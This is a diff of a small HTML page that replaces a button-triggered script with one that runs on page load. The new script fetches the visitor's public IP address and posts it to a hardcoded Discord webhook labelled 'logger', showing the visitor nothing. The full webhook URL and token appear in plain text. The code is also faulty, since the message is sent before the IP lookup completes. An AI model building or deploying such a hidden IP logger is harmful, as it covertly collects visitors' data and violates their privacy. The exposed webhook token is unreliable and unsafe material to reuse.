@@ -1,31 +1,45 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ping</title>
-  </head>
-  <body>
-    <button onclick="sendMessage()">Send</button>
-  </body>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+</head>
+<body>
 
-  <script>
-    function sendMessage() {
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/932549341762158602/wgY6aMC_H6YSdM17kJa3vihZzaVz5bS5S4lmJNL3BivXvIZ0amJUg_xz3Nt-OD_Ummvb");
+<script>
 
-      request.setRequestHeader('Content-type', 'application/json');
-      
-      import("https://api.ipify.org?format=jsonp&callback=getIP");
-      function getIP(json) { alert(`Your IP Address is ${json.ip}`) }
-      
-      const params = {
-        username: "Pinger",
-        avatar_url: "",
-        content: json.ip
-      }
+var obj
 
-      request.send(JSON.stringify(params));
-    }
-  </script>
+fetch('https://api.ipify.org/?format=json')
+  .then(response => response.json())
+  .then(data => obj = data)
+  .then(() => console.log(obj))
+  
+console.log(obj)
+
+
+  
+    
+const request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/932549341762158602/wgY6aMC_H6YSdM17kJa3vihZzaVz5bS5S4lmJNL3BivXvIZ0amJUg_xz3Nt-OD_Ummvb");
+
+request.setRequestHeader('Content-type', 'application/json');
+    
+	
+    
+const params = {
+   username: "logger",
+   avatar_url: "",
+   content: ("logged! " + obj)
+}
+
+console.log(obj)
+
+request.send(JSON.stringify(params));
+  
+console.log(params)
+
+    
+</script>
+  
+  
+</body>
 </html>
